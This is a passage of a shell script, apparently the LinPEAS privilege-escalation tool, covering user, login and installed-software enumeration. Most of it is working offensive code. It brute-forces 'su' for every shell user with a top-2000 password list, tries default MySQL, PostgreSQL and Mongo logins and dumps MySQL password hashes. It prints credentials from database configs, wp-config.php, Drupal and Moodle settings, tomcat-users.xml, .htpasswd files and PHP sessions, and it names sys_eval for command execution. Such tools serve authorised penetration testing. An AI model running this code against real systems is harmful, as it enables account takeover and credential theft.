  3269	  dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
  3270	else
  3271	  cut -d":" -f1 /etc/passwd 2>/dev/null| while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
  3272	fi
  3273	echo ""
  3274	
  3275	#-- UI) Login now
  3276	print_2title "Login now"
  3277	(w || who || finger || users) 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3278	echo ""
  3279	
  3280	#-- UI) Last logons
  3281	print_2title "Last logons"
  3282	(last -Faiw || last) 2>/dev/null | tail | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_RED}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3283	echo ""
  3284	
  3285	#-- UI) Login info
  3286	print_2title "Last time logon each user"
  3287	lastlog 2>/dev/null | grep -v "Never" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3288	
  3289	EXISTS_FINGER="$(command -v finger 2>/dev/null)"
  3290	if [ "$MACPEAS" ] && [ "$EXISTS_FINGER" ]; then
  3291	  dscl . list /Users | while read uname; do
  3292	    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
  3293	    if grep -q "$ushell" /etc/shells; then #Shell user
  3294	      finger "$uname" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3295	      echo ""
  3296	    fi
  3297	  done
  3298	fi
  3299	echo ""
  3300	
  3301	#-- UI) Password policy
  3302	if [ "$EXTRA_CHECKS" ]; then
  3303	  print_2title "Password policy"
  3304	  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  3305	  echo ""
  3306	
  3307	  if [ "$MACPEAS" ]; then
  3308	    print_2title "Relevant last user info and user configs"
  3309	    defaults read /Library/Preferences/com.apple.loginwindow.plist 2>/dev/null
  3310	    echo ""
  3311	
  3312	    print_2title "Guest user status"
  3313	    sysadminctl -afpGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
  3314	    sysadminctl -guestAccount status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
  3315	    sysadminctl -smbGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
  3316	    echo ""
  3317	  fi
  3318	fi
  3319	
  3320	#-- UI) Brute su
  3321	EXISTS_SUDO="$(command -v sudo 2>/dev/null)"
  3322	if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ] && [ "$EXISTS_SUDO" ]; then
  3323	  print_2title "Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
  3324	  POSSIBE_SU_BRUTE=$(check_if_su_brute);
  3325	  if [ "$POSSIBE_SU_BRUTE" ]; then
  3326	    SHELLUSERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
  3327	    printf "%s\n" "$SHELLUSERS" | while read u; do
  3328	      echo "  Bruteforcing user $u..."
  3329	      su_brute_user_num "$u" $PASSTRY
  3330	    done
  3331	  else
  3332	    printf $GREEN"It's not possible to brute-force su.\n\n"$NC
  3333	  fi
  3334	else
  3335	  print_2title "Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
  3336	fi
  3337	print_2title "Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC
  3338	
  3339	fi
  3340	echo ''
  3341	echo ''
  3342	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  3343	
  3344	if echo $CHECKS | grep -q software_information; then
  3345	print_title "Software Information"
  3346	###########################################
  3347	#--------) Software Information (---------#
  3348	###########################################
  3349	
  3350	NGINX_KNOWN_MODULES="ngx_http_geoip_module.so|ngx_http_xslt_filter_module.so|ngx_stream_geoip_module.so|ngx_http_image_filter_module.so|ngx_mail_module.so|ngx_stream_module.so"
  3351	
  3352	#-- SI) Useful software
  3353	if ! [ "$SEARCH_IN_FOLDER" ]; then
  3354	  print_2title "Useful software"
  3355	  for tool in $USEFUL_SOFTWARE; do command -v "$tool"; done
  3356	  echo ""
  3357	fi
  3358	
  3359	#-- SI) Search for compilers
  3360	if ! [ "$SEARCH_IN_FOLDER" ]; then
  3361	  print_2title "Installed Compilers"
  3362	  (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; command -v gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/");
  3363	  echo ""
  3364	
  3365	  if [ "$(command -v pkg 2>/dev/null)" ]; then
  3366	      print_2title "Vulnerable Packages"
  3367	      pkg audit -F | sed -${E} "s,vulnerable,${SED_RED},g"
  3368	      echo ""
  3369	  fi
  3370	
  3371	  if [ "$(command -v brew 2>/dev/null)" ]; then
  3372	      print_2title "Brew Installed Packages"
  3373	      brew list
  3374	      echo ""
  3375	  fi
  3376	fi
  3377	
  3378	if [ "$MACPEAS" ]; then
  3379	    print_2title "Writable Installed Applications"
  3380	    system_profiler SPApplicationsDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
  3381	        if [ -w "$f" ]; then
  3382	            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
  3383	        fi
  3384	    done
  3385	
  3386	    system_profiler SPFrameworksDataType | grep "Location:" | cut -d ":" -f 2 | cut -c2- | while read f; do
  3387	        if [ -w "$f" ]; then
  3388	            echo "$f is writable" | sed -${E} "s,.*,${SED_RED},g"
  3389	        fi
  3390	    done
  3391	fi
  3392	
  3393	#-- SI) Mysql version
  3394	if [ "$(command -v mysql)" ] || [ "$(command -v mysqladmin)" ] || [ "$DEBUG" ]; then
  3395	  print_2title "MySQL version"
  3396	  mysql --version 2>/dev/null || echo_not_found "mysql"
  3397	  mysqluser=$(systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1)
  3398	  if [ "$mysqluser" ]; then
  3399	    echo "MySQL user: $mysqluser" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3400	  fi
  3401	  echo ""
  3402	  echo ""
  3403	
  3404	  #-- SI) Mysql connection root/root
  3405	  print_list "MySQL connection using default root/root ........... "
  3406	  mysqlconnect=$(mysqladmin -uroot -proot version 2>/dev/null)
  3407	  if [ "$mysqlconnect" ]; then
  3408	    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3409	    mysql -u root --password=root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  3410	  else echo_no
  3411	  fi
  3412	
  3413	  #-- SI) Mysql connection root/toor
  3414	  print_list "MySQL connection using root/toor ................... "
  3415	  mysqlconnect=$(mysqladmin -uroot -ptoor version 2>/dev/null)
  3416	  if [ "$mysqlconnect" ]; then
  3417	    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3418	    mysql -u root --password=toor -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  3419	  else echo_no
  3420	  fi
  3421	
  3422	  #-- SI) Mysql connection root/NOPASS
  3423	  mysqlconnectnopass=$(mysqladmin -uroot version 2>/dev/null)
  3424	  print_list "MySQL connection using root/NOPASS ................. "
  3425	  if [ "$mysqlconnectnopass" ]; then
  3426	    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3427	    mysql -u root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  3428	  else echo_no
  3429	  fi
  3430	  echo ""
  3431	fi
  3432	
  3433	#-- SI) Mysql credentials
  3434	if [ "$PSTORAGE_MYSQL" ] || [ "$DEBUG" ]; then
  3435	  print_2title "Searching mysql credentials and exec"
  3436	  printf "%s\n" "$PSTORAGE_MYSQL" | while read d; do
  3437	    if [ -f "$d" ] && ! [ "$(basename $d)" = "mysql" ]; then # Only interested in "mysql" that are folders (filesaren't the ones with creds)
  3438	      STRINGS="`command -v strings`"
  3439	      echo "Potential file containing credentials:"
  3440	      ls -l "$d"
  3441	      if [ "$STRINGS" ]; then
  3442	        strings "$d"
  3443	      else
  3444	        echo "Strings not found, cat the file and check it to get the creds"
  3445	      fi
  3446	
  3447	    else
  3448	      for f in $(find $d -name debian.cnf 2>/dev/null); do
  3449	        if [ -r "$f" ]; then
  3450	          echo "We can read the mysql debian.cnf. You can use this username/password to log in MySQL" | sed -${E} "s,.*,${SED_RED},"
  3451	          cat "$f"
  3452	        fi
  3453	      done
  3454	      
  3455	      for f in $(find $d -name user.MYD 2>/dev/null); do
  3456	        if [ -r "$f" ]; then
  3457	          echo "We can read the Mysql Hashes from $f" | sed -${E} "s,.*,${SED_RED},"
  3458	          grep -oaE "[-_\.\*a-Z0-9]{3,}" "$f" | grep -v "mysql_native_password"
  3459	        fi
  3460	      done
  3461	      
  3462	      for f in $(grep -lr "user\s*=" $d 2>/dev/null | grep -v "debian.cnf"); do
  3463	        if [ -r "$f" ]; then
  3464	          u=$(cat "$f" | grep -v "#" | grep "user" | grep "=" 2>/dev/null)
  3465	          echo "From '$f' Mysql user: $u" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3466	        fi
  3467	      done
  3468	      
  3469	      for f in $(find $d -name my.cnf 2>/dev/null); do
  3470	        if [ -r "$f" ]; then
  3471	          echo "Found readable $f"
  3472	          grep -v "^#" "$f" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed "s,password.*,${SED_RED},"
  3473	        fi
  3474	      done
  3475	    fi
  3476	    
  3477	    mysqlexec=$(whereis lib_mysqludf_sys.so 2>/dev/null | grep -Ev '^lib_mysqludf_sys.so:$' | grep "lib_mysqludf_sys\.so")
  3478	    if [ "$mysqlexec" ]; then
  3479	      echo "Found $mysqlexec. $(whereis lib_mysqludf_sys.so)"
  3480	      echo "If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');" | sed -${E} "s,.*,${SED_RED},"
  3481	    fi
  3482	  done
  3483	fi
  3484	echo ""
  3485	
  3486	if [ "$PSTORAGE_MARIADB" ] || [ "$DEBUG" ]; then
  3487	  print_2title "Analyzing MariaDB Files (limit 70)"
  3488	    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"mariadb\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mariadb.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "mariadb\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mariadb\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*,${SED_RED},g"; done; echo "";
  3489	    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"debian\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "debian.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "debian\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,debian\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*" | sed -${E} "s,user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*,${SED_RED},g"; done; echo "";
  3490	fi
  3491	
  3492	
  3493	if [ "$PSTORAGE_POSTGRESQL" ] || [ "$DEBUG" ]; then
  3494	  print_2title "Analyzing PostgreSQL Files (limit 70)"
  3495	    echo "Version: $(warn_exec psql -V 2>/dev/null)"
  3496	    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgadmin.*\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgadmin*.db"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgadmin.*\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgadmin.*\.db$,${SED_RED},"; done; echo "";
  3497	    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pg_hba\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pg_hba.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pg_hba\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pg_hba\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
  3498	    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"postgresql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postgresql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "postgresql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postgresql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
  3499	    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgsql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgsql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgsql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgsql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
  3500	    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgadmin4\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgadmin4.db"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgadmin4\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgadmin4\.db$,${SED_RED},"; done; echo "";
  3501	fi
  3502	
  3503	
  3504	#-- SI) PostgreSQL brute
  3505	if [ "$TIMEOUT" ] && [ "$(command -v psql)" ] || [ "$DEBUG" ]; then  # In some OS (like OpenBSD) it will expect the password from console and will pause the script. Also, this OS doesn't have the "timeout" command so lets only use this checks in OS that has it.
  3506	#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
  3507	  print_list "PostgreSQL connection to template0 using postgres/NOPASS ........ "
  3508	  if [ "$(timeout 1 psql -U postgres -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3509	  else echo_no
  3510	  fi
  3511	
  3512	  print_list "PostgreSQL connection to template1 using postgres/NOPASS ........ "
  3513	  if [ "$(timeout 1 psql -U postgres -d template1 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed "s,.*,${SED_RED},"
  3514	  else echo_no
  3515	  fi
  3516	
  3517	  print_list "PostgreSQL connection to template0 using pgsql/NOPASS ........... "
  3518	  if [ "$(timeout 1 psql -U pgsql -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3519	  else echo_no
  3520	  fi
  3521	
  3522	  print_list "PostgreSQL connection to template1 using pgsql/NOPASS ........... "
  3523	  if [ "$(timeout 1 psql -U pgsql -d template1 -c 'select version()' 2> /dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  3524	  else echo_no
  3525	  fi
  3526	  echo ""
  3527	fi
  3528	
  3529	if [ "$PSTORAGE_MONGO" ] || [ "$DEBUG" ]; then
  3530	  print_2title "Analyzing Mongo Files (limit 70)"
  3531	    echo "Version: $(warn_exec mongo --version 2>/dev/null; warn_exec mongod --version 2>/dev/null)"
  3532	    if [ "$(command -v mongo)" ]; then echo "show dbs" | mongo 127.0.0.1 > /dev/null 2>&1;[ "$?" == "0" ] && echo "Possible mongo anonymous authentication" | sed -${E} "s,.*|kube,${SED_RED},"; fi
  3533	    if ! [ "`echo \"$PSTORAGE_MONGO\" | grep -E \"mongod.*\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mongod*.conf"; fi; fi; printf "%s" "$PSTORAGE_MONGO" | grep -E "mongod.*\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mongod.*\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#"; done; echo "";
  3534	fi
  3535	
  3536	
  3537	if [ "$PSTORAGE_APACHE_NGINX" ] || [ "$DEBUG" ]; then
  3538	  print_2title "Analyzing Apache-Nginx Files (limit 70)"
  3539	    echo "Apache version: $(warn_exec apache2 -v 2>/dev/null; warn_exec httpd -v 2>/dev/null)"
  3540	    echo "Nginx version: $(warn_exec nginx -v 2>/dev/null)"
  3541	    if [ -d "/etc/apache2" ] && [ -r "/etc/apache2" ]; then grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null; fi
  3542	    if [ -d "/usr/share/nginx/modules" ] && [ -r "/usr/share/nginx/modules" ]; then print_3title 'Nginx modules'; ls /usr/share/nginx/modules | sed -${E} "s,$NGINX_KNOWN_MODULES,${SED_GREEN},g"; fi
  3543	    print_3title 'PHP exec extensions'
  3544	    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"sites-enabled$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites-enabled"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "sites-enabled$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites-enabled$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias|command on,${SED_RED},g"; done; echo "";done; echo "";
  3545	    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"000-default\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "000-default.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "000-default\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,000-default\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias,${SED_RED},g"; done; echo "";
  3546	    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"php\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "php.ini"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "php\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,php\.ini$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E allow_ | grep -Ev "^;" | sed -${E} "s,On,${SED_RED},g"; done; echo "";
  3547	    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";
  3548	    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx$,${SED_RED},"; find "$f" -name "*.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";done; echo "";
  3549	fi
  3550	
  3551	
  3552	if [ "$PSTORAGE_TOMCAT" ] || [ "$DEBUG" ]; then
  3553	  print_2title "Analyzing Tomcat Files (limit 70)"
  3554	    if ! [ "`echo \"$PSTORAGE_TOMCAT\" | grep -E \"tomcat-users\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "tomcat-users.xml"; fi; fi; printf "%s" "$PSTORAGE_TOMCAT" | grep -E "tomcat-users\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,tomcat-users\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username=|password=" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
  3555	fi
  3556	
  3557	
  3558	if [ "$PSTORAGE_FASTCGI" ] || [ "$DEBUG" ]; then
  3559	  print_2title "Analyzing FastCGI Files (limit 70)"
  3560	    if ! [ "`echo \"$PSTORAGE_FASTCGI\" | grep -E \"fastcgi_params$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "fastcgi_params"; fi; fi; printf "%s" "$PSTORAGE_FASTCGI" | grep -E "fastcgi_params$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,fastcgi_params$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "DB_NAME|DB_USER|DB_PASS" | sed -${E} "s,DB_NAME|DB_USER|DB_PASS,${SED_RED},g"; done; echo "";
  3561	fi
  3562	
  3563	
  3564	if [ "$PSTORAGE_HTTP_CONF" ] || [ "$DEBUG" ]; then
  3565	  print_2title "Analyzing Http conf Files (limit 70)"
  3566	    if ! [ "`echo \"$PSTORAGE_HTTP_CONF\" | grep -E \"httpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "httpd.conf"; fi; fi; printf "%s" "$PSTORAGE_HTTP_CONF" | grep -E "httpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,httpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "htaccess.*|htpasswd.*" | grep -Ev "\W+\#|^#" | sed -${E} "s,htaccess.*|htpasswd.*,${SED_RED},g"; done; echo "";
  3567	fi
  3568	
  3569	
  3570	if [ "$PSTORAGE_HTPASSWD" ] || [ "$DEBUG" ]; then
  3571	  print_2title "Analyzing Htpasswd Files (limit 70)"
  3572	    if ! [ "`echo \"$PSTORAGE_HTPASSWD\" | grep -E \"\.htpasswd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".htpasswd"; fi; fi; printf "%s" "$PSTORAGE_HTPASSWD" | grep -E "\.htpasswd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.htpasswd$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  3573	fi
  3574	
  3575	
  3576	if [ "$PSTORAGE_PHP_SESSIONS" ] || [ "$DEBUG" ]; then
  3577	  print_2title "Analyzing PHP Sessions Files (limit 70)"
  3578	    ls /var/lib/php/sessions 2>/dev/null || echo_not_found /var/lib/php/sessions
  3579	    if ! [ "`echo \"$PSTORAGE_PHP_SESSIONS\" | grep -E \"sess_.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sess_*"; fi; fi; printf "%s" "$PSTORAGE_PHP_SESSIONS" | grep -E "sess_.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sess_.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  3580	fi
  3581	
  3582	
  3583	if [ "$PSTORAGE_WORDPRESS" ] || [ "$DEBUG" ]; then
  3584	  print_2title "Analyzing Wordpress Files (limit 70)"
  3585	    if ! [ "`echo \"$PSTORAGE_WORDPRESS\" | grep -E \"wp-config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wp-config.php"; fi; fi; printf "%s" "$PSTORAGE_WORDPRESS" | grep -E "wp-config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wp-config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "PASSWORD|USER|NAME|HOST" | sed -${E} "s,PASSWORD|USER|NAME|HOST,${SED_RED},g"; done; echo "";
  3586	fi
  3587	
  3588	
  3589	if [ "$PSTORAGE_DRUPAL" ] || [ "$DEBUG" ]; then
  3590	  print_2title "Analyzing Drupal Files (limit 70)"
  3591	    if ! [ "`echo \"$PSTORAGE_DRUPAL\" | grep -E \"settings\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "settings.php"; fi; fi; printf "%s" "$PSTORAGE_DRUPAL" | grep -E "settings\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,settings\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix'" | sed -${E} "s,drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix',${SED_RED},g"; done; echo "";
  3592	fi
  3593	
  3594	
  3595	if [ "$PSTORAGE_MOODLE" ] || [ "$DEBUG" ]; then
  3596	  print_2title "Analyzing Moodle Files (limit 70)"
  3597	    if ! [ "`echo \"$PSTORAGE_MOODLE\" | grep -E \"config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "config.php"; fi; fi; printf "%s" "$PSTORAGE_MOODLE" | grep -E "config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "dbtype|dbhost|dbuser|dbhost|dbpass|dbport" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
  3598	fi
  3599	
  3600	
  3601	if [ "$PSTORAGE_SUPERVISORD" ] || [ "$DEBUG" ]; then
  3602	  print_2title "Analyzing Supervisord Files (limit 70)"
  3603	    if ! [ "`echo \"$PSTORAGE_SUPERVISORD\" | grep -E \"supervisord\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "supervisord.conf"; fi; fi; printf "%s" "$PSTORAGE_SUPERVISORD" | grep -E "supervisord\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,supervisord\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "port.*=|username.*=|password.*=" | sed -${E} "s,port.*=|username.*=|password.*=,${SED_RED},g"; done; echo "";
  3604	fi
  3605	
  3606	
  3607	if [ "$PSTORAGE_CESI" ] || [ "$DEBUG" ]; then
  3608	  print_2title "Analyzing Cesi Files (limit 70)"
